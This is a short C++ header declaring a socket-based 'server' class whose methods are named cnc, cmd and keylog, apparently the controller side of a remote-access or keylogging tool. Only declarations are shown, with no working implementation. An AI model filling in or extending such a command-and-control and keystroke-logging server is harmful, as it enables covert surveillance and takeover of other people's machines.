#pragma once

#include <iostream>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>
#include <string>

#define BLUE     "\033[34m"
#define GREEN    "\033[32m"
#define NC       "\033[39m"
#define MAX      65536

class server{
private:
    int sockfd;
    int connect;

    char recv_buf[MAX];
    char send_buf[MAX];
    std::string str;
public:
    server();
    ~server();
    void cnc();
    bool setup();
    int cmd(const char *);
    void keylog(int, char[]);
};